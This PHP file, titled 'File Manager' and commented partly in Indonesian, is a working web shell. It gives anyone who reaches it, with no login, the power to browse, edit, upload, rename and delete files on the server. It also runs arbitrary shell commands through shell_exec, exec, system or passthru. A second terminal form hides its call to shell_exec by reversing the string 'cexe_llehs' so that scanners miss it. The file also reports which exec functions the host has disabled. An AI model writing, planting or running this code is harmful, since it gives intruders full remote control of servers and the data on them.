<?php
// ================== HARD FIX PHP 5.6 ==================
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Jangan maksa ini_set di shared hosting keras
// ini_set('upload_max_filesize', '30M');
// ini_set('post_max_size', '30M');
// ini_set('max_execution_time', 300);
// ini_set('max_input_time', 300);

// ================== PATH HANDLING ==================
$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
$path = realpath($path);
if ($path === false || !is_dir($path)) {
    die('Invalid or inaccessible path');
}
chdir($path);

// ================== DELETE ==================
if (isset($_GET['delete'])) {
    $target = realpath($_GET['delete']);
    if ($target && strpos($target, $path) === 0) {
        if (is_file($target)) @unlink($target);
        elseif (is_dir($target)) @rmdir($target);
    }
    header('Location: ?path=' . urlencode(dirname($target)));
    exit;
}

// ================== RENAME (PHP 5.6 SAFE) ==================
if (isset($_POST['rename_old']) && isset($_POST['rename_new'])) {
    $old = $_POST['rename_old'];
    $new = $_POST['rename_new'];
    if (file_exists($old)) {
        @rename($old, dirname($old) . '/' . basename($new));
    }
    header('Location: ?path=' . urlencode($path));
    exit;
}

// ================== EDIT FILE ==================
if (isset($_GET['edit'])) {
    $editFile = realpath($_GET['edit']);
    if (!$editFile || !is_file($editFile)) die('File not found');

    if (isset($_POST['new_content'])) {
        file_put_contents($editFile, $_POST['new_content']);
        header('Location: ?path=' . urlencode($path));
        exit;
    }

    $content = htmlspecialchars(file_get_contents($editFile));
    ?>
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Edit</title></head>
<body style="background:#0b1020;color:#9ec6ff;font-family:monospace">
<h3>Edit: <?php echo htmlspecialchars($editFile); ?></h3>
<form method="post">
<textarea name="new_content" style="width:100%;height:80vh;background:#050914;color:#9ec6ff;"><?php echo $content; ?></textarea><br>
<input type="submit" value="Save">
</form>
</body></html>
<?php
    exit;
}

// ================== UPLOAD ==================
if (isset($_FILES['file_upload'])) {
    if (is_uploaded_file($_FILES['file_upload']['tmp_name'])) {
        move_uploaded_file(
            $_FILES['file_upload']['tmp_name'],
            $path . '/' . basename($_FILES['file_upload']['name'])
        );
    }
    header('Location: ?path=' . urlencode($path));
    exit;
}

// ================== CREATE FILE ==================
if (isset($_POST['new_file'])) {
    $nf = $path . '/' . basename($_POST['new_file']);
    if (!file_exists($nf)) file_put_contents($nf, '');
    header('Location: ?path=' . urlencode($path));
    exit;
}

// ================== CREATE FOLDER ==================
if (isset($_POST['new_folder'])) {
    $nd = $path . '/' . basename($_POST['new_folder']);
    if (!file_exists($nd)) mkdir($nd, 0755);
    header('Location: ?path=' . urlencode($path));
    exit;
}

// ================== CMD EXEC ==================
$cmd_output = '';
if (isset($_POST['cmd']) && $_POST['cmd'] !== '') {
    $cmd = $_POST['cmd'];

    if (fungsi_tersedia('shell_exec')) {
        $cmd_output = shell_exec($cmd . ' 2>&1');
    } elseif (fungsi_tersedia('exec')) {
        exec($cmd . ' 2>&1', $out);
        $cmd_output = implode("\n", $out);
    } elseif (fungsi_tersedia('system')) {
        ob_start();
        system($cmd);
        $cmd_output = ob_get_clean();
    } elseif (fungsi_tersedia('passthru')) {
        ob_start();
        passthru($cmd);
        $cmd_output = ob_get_clean();
    } else {
        $cmd_output = 'No exec function available';
    }
}

// ================== FUNCTION CHECK ==================
function fungsi_tersedia($f) {
    $d = explode(',', ini_get('disable_functions'));
    return !in_array($f, $d);
}
$functions = array('exec','shell_exec','passthru','system','popen','proc_open');

if (!is_readable($path)) die('Permission denied');
$files = scandir($path);
?>
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>File Manager</title></head>
<body style="background:#060b18;color:#d7e1f3;font-family:Arial">
<h2>Path: <?php echo htmlspecialchars($path); ?></h2>

<form method="post" enctype="multipart/form-data">
<input type="file" name="file_upload"><input type="submit" value="Upload">
</form>
<form method="post">
<input type="text" name="new_file" placeholder="new file"><input type="submit" value="Create">
</form>
<form method="post">
<input type="text" name="new_folder" placeholder="new folder"><input type="submit" value="Create">
</form>

<h3>Terminal Status</h3>
<ul>
<?php foreach ($functions as $f) echo '<li>'.$f.' : '.(fungsi_tersedia($f)?'ON':'OFF').'</li>'; ?>
</ul>
<h3>T3RM1N4L</h3>
<!-- <form method="post">
<input type="text" name="cmd" style="width:80%;background:#050914;color:#9ec6ff"
       placeholder="whoami ">
<input type="submit" value="Run">
</form> -->
<form method="post">
    <input type="text" name="ktl" placeholder="M4SUKK4N C0MM4ND">
    <button type="submit">LARI</button>
</form>
<?php

$crot = '';

$text = "cexe_llehs";
$order = [9,8,7,6,5,4,3,2,1,0];
// $text = "cexe";
// $order = [3,2,1,0];
$out = '';
foreach ($order as $i) {
    $out .= $text[$i];
}

if (isset($_POST['ktl']) && $_POST['ktl'] !== '') {
    $inptus = $_POST['ktl'];
    if (function_exists($out)) {
        $crot = $out($inptus . ' 2>&1');
    } else {
        $crot = 'Function disabled';
    }
}

?>
<?php if ($crot !== ''): ?>
<pre style="background:#050914;color:#7CFC00;padding:10px;max-height:300px;overflow:auto">
<?php echo htmlspecialchars($crot, ENT_QUOTES, 'UTF-8'); ?>
</pre>
<?php endif; ?>

<table border="1" cellpadding="6" cellspacing="0">
<tr><th>Name</th><th>Size</th><th>Action</th></tr>
<?php
if ($path != '/') echo '<tr><td colspan="3"><a href="?path='.urlencode(dirname($path)).'">Back</a></td></tr>';
foreach ($files as $f) {
    if ($f=='.' || $f=='..') continue;
    $full = $path . '/' . $f;
    echo '<tr>';
    echo '<td>' . (is_dir($full) ? '<a href="?path='.urlencode($full).'">[DIR] '.$f.'</a>' : $f) . '</td>';
    echo '<td>' . (is_file($full) ? filesize($full).' bytes' : '-') . '</td>';
    echo '<td>';
    if (is_file($full)) echo '<a href="?edit='.urlencode($full).'">Edit</a> | ';
    echo '<form method="post" style="display:inline">'
        .'<input type="hidden" name="rename_old" value="'.$full.'">'
        .'<input type="text" name="rename_new" placeholder="Rename" size="10">'
        .'<input type="submit" value="OK">'
        .'</form> | ';
    echo '<a href="?delete='.urlencode($full).'" onclick="return confirm(\'Delete?\')">Delete</a>';
    echo '</td></tr>';
}
?>
</table>
</body>
</html>
